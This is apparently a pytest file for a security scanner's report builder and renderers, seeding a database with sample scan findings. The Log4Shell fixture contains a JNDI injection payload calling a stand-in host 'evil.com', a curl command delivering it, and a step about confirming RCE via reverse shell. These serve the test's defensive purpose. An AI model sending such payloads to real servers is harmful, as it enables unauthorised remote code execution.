"""Report builder + render tests."""

from __future__ import annotations

import asyncio
import importlib.util
import sys
from pathlib import Path
from types import ModuleType

import pytest

from secbot.cmdb import db as cmdb_db
from secbot.cmdb.models import Base
from secbot.cmdb.repo import (
    create_scan,
    update_scan_status,
    upsert_asset,
    upsert_service,
    upsert_vulnerability,
)
from secbot.report.builder import ReportRenderError, build_report_model
from secbot.report.render import render_html, render_markdown
from secbot.skills.types import SkillContext

_SKILLS_ROOT = Path(__file__).resolve().parents[2] / "secbot" / "skills"


def _load(name: str) -> ModuleType:
    mod_name = f"_secbot_skill_{name.replace('-', '_')}_handler"
    if mod_name in sys.modules:
        return sys.modules[mod_name]
    spec = importlib.util.spec_from_file_location(
        mod_name, _SKILLS_ROOT / name / "handler.py"
    )
    assert spec and spec.loader
    mod = importlib.util.module_from_spec(spec)
    sys.modules[mod_name] = mod
    spec.loader.exec_module(mod)
    return mod


# ---------------------------------------------------------------------------
# DB fixtures (mirrors tests/cmdb/conftest.py)
# ---------------------------------------------------------------------------


@pytest.fixture()
async def cmdb_engine(tmp_path: Path):
    await cmdb_db.dispose_engine()
    db_file = tmp_path / "report-cmdb.sqlite3"
    engine = cmdb_db.init_engine(f"sqlite+aiosqlite:///{db_file}")
    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)
    yield engine
    await cmdb_db.dispose_engine()


async def _seed(actor: str = "local") -> str:
    """Insert one scan with one asset, one service, and two vulns."""
    async with cmdb_db.get_session() as session:
        scan = await create_scan(session, actor, target="10.0.0.0/24")
        await update_scan_status(session, actor, scan.id, status="running")
        asset = await upsert_asset(
            session, actor, scan_id=scan.id, target="10.0.0.5",
            ip="10.0.0.5", hostname="db.example",
        )
        svc = await upsert_service(
            session, actor, asset_id=asset.id, port=22, protocol="tcp",
            service="ssh", product="OpenSSH", version="8.4",
        )
        await upsert_vulnerability(
            session, actor, asset_id=asset.id, service_id=svc.id,
            severity="critical", category="cve", title="Log4Shell",
            cve_id="CVE-2021-44228", discovered_by="nuclei-template-scan",
            evidence={
                "summary": "RCE on /api",
                "matched_at": "http://10.0.0.5:8080/api/login",
                "request": "POST /api/login HTTP/1.1\nHost: 10.0.0.5:8080\nContent-Type: application/json\n\n{\"user\":\"${jndi:ldap://evil.com/exploit}\"}",
                "response": "HTTP/1.1 500 Internal Server Error\n\nError processing JNDI lookup",
                "curl_command": "curl -X POST http://10.0.0.5:8080/api/login -d '{\"user\":\"${jndi:ldap://evil.com/exploit}\"}'",
                "verification_steps": [
                    "Send POST request to /api/login with JNDI payload",
                    "Check server logs for outbound LDAP connection",
                    "Confirm RCE via reverse shell callback",
                ],
                "remediation": "Upgrade Log4j to 2.17.0+ and set log4j2.formatMsgNoLookups=true",
                "references": [
                    "https://nvd.nist.gov/vuln/detail/CVE-2021-44228",
                    "https://logging.apache.org/log4j/2.x/security.html",
                ],
            },
            raw_log_path="/tmp/raw/nuclei.jsonl",
        )
        await upsert_vulnerability(
            session, actor, asset_id=asset.id,
            severity="medium", category="exposure", title="Exposed Git",
            discovered_by="fscan-vuln-scan",
        )
        await update_scan_status(session, actor, scan.id, status="completed")
        return scan.id


# ---------------------------------------------------------------------------
# Builder + render
# ---------------------------------------------------------------------------


async def test_build_report_model_aggregates_severity(cmdb_engine):
    scan_id = await _seed()
    async with cmdb_db.get_session() as session:
        model = await build_report_model(session, scan_id)
    assert model.summary.asset_count == 1
    assert model.summary.service_count == 1
    assert model.summary.finding_count == 2
    assert model.summary.severity_counts["critical"] == 1
    assert model.summary.severity_counts["medium"] == 1
    assert model.summary.severity_counts["high"] == 0
    assert model.appendix.raw_log_paths == ["/tmp/raw/nuclei.jsonl"]


async def test_build_report_model_unknown_scan_raises(cmdb_engine):
    async with cmdb_db.get_session() as session:
        with pytest.raises(ReportRenderError):
            await build_report_model(session, "DOES-NOT-EXIST")


async def test_render_markdown_contains_key_fields(cmdb_engine):
    scan_id = await _seed()
    async with cmdb_db.get_session() as session:
        model = await build_report_model(session, scan_id)
    md = render_markdown(model)
    assert "# 安全扫描报告" in md
    assert "Log4Shell" in md
    assert "CVE-2021-44228" in md
    assert "10.0.0.5" in md
    assert "| 严重 | 1 |" in md
    # New fields
    assert "验证步骤" in md
    assert "Send POST request to /api/login with JNDI payload" in md
    assert "证据详情" in md
    assert "修复建议" in md
    assert "Upgrade Log4j to 2.17.0+" in md
    assert "参考资料" in md
    assert "https://nvd.nist.gov/vuln/detail/CVE-2021-44228" in md
    assert "http://10.0.0.5:8080/api/login" in md


async def test_render_html_inlines_severity_badges(cmdb_engine):
    scan_id = await _seed()
    async with cmdb_db.get_session() as session:
        model = await build_report_model(session, scan_id)
    html = render_html(model)
    assert "<!DOCTYPE html>" in html
    assert "sev-critical" in html
    assert "Log4Shell" in html
    assert "开放服务" in html
    assert "<td>22</td><td>tcp</td><td>ssh</td><td>OpenSSH</td><td>8.4</td>" in html
    # New finding card fields
    assert "finding-card" in html
    assert "验证步骤" in html
    assert "Send POST request to /api/login with JNDI payload" in html
    assert "证据详情" in html
    assert "修复建议" in html
    assert "Upgrade Log4j to 2.17.0+" in html
    assert "参考资料" in html
    assert "http://10.0.0.5:8080/api/login" in html
    assert "pre.evidence" in html or 'class="evidence"' in html


async def test_builder_extracts_extended_evidence_fields(cmdb_engine):
    """build_report_model must populate the new ReportFinding fields."""
    scan_id = await _seed()
    async with cmdb_db.get_session() as session:
        model = await build_report_model(session, scan_id)
    # Find the Log4Shell finding
    log4shell = None
    for asset in model.assets:
        for f in asset.findings:
            if f.title == "Log4Shell":
                log4shell = f
                break
    assert log4shell is not None
    assert log4shell.affected_url == "http://10.0.0.5:8080/api/login"
    assert log4shell.evidence_summary == "RCE on /api"
    assert len(log4shell.verification_steps) == 3
    assert "JNDI payload" in log4shell.verification_steps[0]
    assert log4shell.remediation is not None
    assert "Log4j" in log4shell.remediation
    assert len(log4shell.references) == 2
    assert log4shell.evidence_detail is not None
    assert "POST /api/login" in log4shell.evidence_detail


# ---------------------------------------------------------------------------
# Skill handlers
# ---------------------------------------------------------------------------


def _ctx(tmp_path: Path) -> SkillContext:
    sd = tmp_path / "scan-001"
    sd.mkdir(parents=True, exist_ok=True)
    return SkillContext(scan_id="scan-001", scan_dir=sd)


async def test_report_html_skill_writes_file(cmdb_engine, tmp_path: Path):
    scan_id = await _seed()
    mod = _load("report-html")
    res = await mod.run({"scan_id": scan_id}, _ctx(tmp_path))
    assert res.summary["status"] == "ok"
    out = Path(res.summary["report_path"])
    assert out.exists()
    assert out.name == "report.html"
    text = out.read_text(encoding="utf-8")
    assert "<!DOCTYPE html>" in text
    assert "Log4Shell" in text
    assert res.summary["asset_count"] == 1
    assert res.summary["finding_count"] == 2


async def test_report_html_skill_empty_scan(cmdb_engine, tmp_path: Path):
    # Create an empty scan with no assets.
    async with cmdb_db.get_session() as session:
        scan = await create_scan(session, "local", target="10.10.10.10")
    mod = _load("report-html")
    res = await mod.run({"scan_id": scan.id}, _ctx(tmp_path))
    assert res.summary["status"] == "empty"
    assert res.summary["report_path"] is None
    assert res.summary["asset_count"] == 0
    assert res.summary["finding_count"] == 0
